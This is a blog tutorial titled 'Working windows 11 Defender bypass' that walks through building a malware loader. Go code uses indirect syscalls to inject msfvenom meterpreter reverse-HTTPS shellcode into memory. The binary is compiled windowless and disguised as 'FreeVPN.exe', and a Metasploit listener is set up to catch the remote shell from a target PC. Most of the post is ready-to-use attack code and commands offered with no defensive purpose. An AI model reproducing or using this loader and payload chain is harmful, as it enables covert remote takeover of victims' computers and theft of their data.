---
layout: post
title: "Working windows 11 Defender bypass"
date: 2026-02-08 08:00 +0530
categories: [Real-Life-Findings]
tags: [Real-Life-Findings]
---

# Full Windows 11 Defender Bypass

![](https://www.bleepstatic.com/content/hl-images/2020/10/13/Windows-10-headpic.jpg)

## Prerequisites

1. Go lang must be installed on your **KALI** with no errors or PATH issues!
2. **MSFVENOM** and **MSFCONSOLE** are also needed for this stuff.
3. Try to do most of the things in the same terminal which you begin with.

Method used :- [youtube](https://youtu.be/f5j0smXXi_4?si=ADNR-GgJcUY2mFbJ)

## STEP 1 :- SAVING THE PAYLOAD PRE-CODE

In Kali, make a `main.go` file with the following contents inside it.....

```go
package main

import (
    "encoding/hex"
    "unsafe"

    "github.com/f1zm0/acheron"
    "golang.org/x/sys/windows"
)

func main() {

    scBuf, _ := hex.DecodeString(
		"SHELL-CODE-HERE",
     )

    var (
	baseAddr uintptr
	hThread  uintptr
	hSelf    = uintptr(0xffffffffffffffff) // handle to current proc
    )

    const (
	nullptr = uintptr(0)
    )
    // creates Acheron instance, resolves SSNs, collects clean trampolines in ntdll.dlll, etc.

    ach, err := acheron.New()
    if err != nil {
        panic(err)
    }
    
    scBufLen := len(scBuf)
    
    ach.Syscall(
		ach.HashString("NtAllocateVirtualMemory"),
		hSelf,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(nil)),
		uintptr(unsafe.Pointer(&scBufLen)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
    );
    
    ach.Syscall(
		ach.HashString("NtWriteVirtualMemory"),
		hSelf,
		uintptr(unsafe.Pointer(baseAddr)),
		uintptr(unsafe.Pointer(&scBuf[0])),
		uintptr(scBufLen),
		0,
    );
    
    ach.Syscall(
		ach.HashString("NtCreateThreadEx"),
		uintptr(unsafe.Pointer(&hThread)),
		windows.GENERIC_EXECUTE,
		0,
		hSelf,
		baseAddr,
		0,
		nullptr,
		0,
		0,
		0,
		0,
    );
    
    windows.WaitForSingleObject(
		windows.Handle(hThread),
		0xffffffff,
    )
    

}
```

**If you don't have any idea what this code means? Chill....... That's why I am here!**

This is the template of our main payload which we are going to make. Our main payload is termed as `shellcode` here, which you can see that the `"SHELL-CODE-HERE"` space is where our main payload stays.

### NOW HOW TO MAKE MAIN PAYLOAD? 🧐

## STEP :- 2 MAKING MAIN PAYLOAD (shellcode)

Switch on your Kali machine and make an msfvenom shellcode by just copy-pasting the below command (**MUST ADJUST IP & PORT**) :-

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=YOUR_IP LPORT=YOUR_PORT -f hex > RAW_payload
```

This guy makes a file named `RAW_payload` in your PWD.

## STEP :- 3 PASTING MAIN PAYLOAD IN TEMPLATE

Now simply copy that whole `HEX` encoded `RAW_payload` file into the clipboard (it's a hell big random string 😒).

You may use this command to directly copy the whole stuff from the file to the clipboard :-

```bash
xclip -selection clipboard < RAW_payload
```

**Now your cute `Template` will look something like this :-**

```go

----SNIP----

func main() {

    scBuf, _ := hex.DecodeString(
		"4d5a4152554889e ---SNIP---- 000000000000ffffffff",
     )

    var (
	baseAddr uintptr
	hThread  uintptr
	hSelf    = uintptr(0xffffffffffffffff) // handle to current proc
    )

----SNIP----

```

Now just **70% of the task is almost DONE!** 😁

## STEP :- 4 INSTALLING SOME LIBRARIES!

Run this command in your Kali, in the same terminal on which you are working till now!

```bash
go get github.com/f1zm0/acheron
```

And in the same terminal, run this command also:

```bash
GOOS=windows GOARCH=amd64 go build -ldflags "-H=windowsgui -s -w" -o FreeVPN.exe main.go
```

After some time, without showing any output, it will create a `FreeVPN.exe` binary which is our final payload!

## WAIT WAIT WAIT................

**Before running it on your target PC, let's set up a Meterpreter listener for our cute silent malware 💀!**

```bash
msfconsole
use multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST=(SAME AS YOU PROVIDED EARLIER)
set LPORT=(SAME AS YOU PROVIDED EARLIER)
run
```

Now simply run this `FreeVPN.exe` on any Windows PC with all Defender + Real-time Protection **ON** and see the magic.
Now you are good to go, and make sure you and your target PC are both on the same network and able to communicate!

**NOTE** :- You may encouter smartScreen

![](https://raw.githubusercontent.com/thepiyushkumarshukla/thepiyushkumarshukla.github.io/refs/heads/main/assets/WhatsApp%20Image%202026-02-08%20at%205.24.54%20PM.jpeg)

 at first time of the execution which doesn't mean it's a paylaod or malware, It only mean that this binary is not from windows and not signed with microsoft so DON'T worry, It not mean you are detected !

---

**FINAL WORDS** :- This method was found on **1 Feb 2026**, so it may be patched soon in Windows 11 and later. But it will work until Microsoft notices this. Moreover, it perfectly works on Windows 10 and later versions also. If you are facing any problem in compilation or any step, then send me a message on my LinkedIn or YouTube comments. OR you may use DeepSeek to troubleshoot any issue or error if you face one in any of the above steps!
ERRORS doesn't mean faliure its a hint, that you missed something or trying a wrong way ! 

***Life is simple: either you control the system, or you become a background process. 💻⚡***


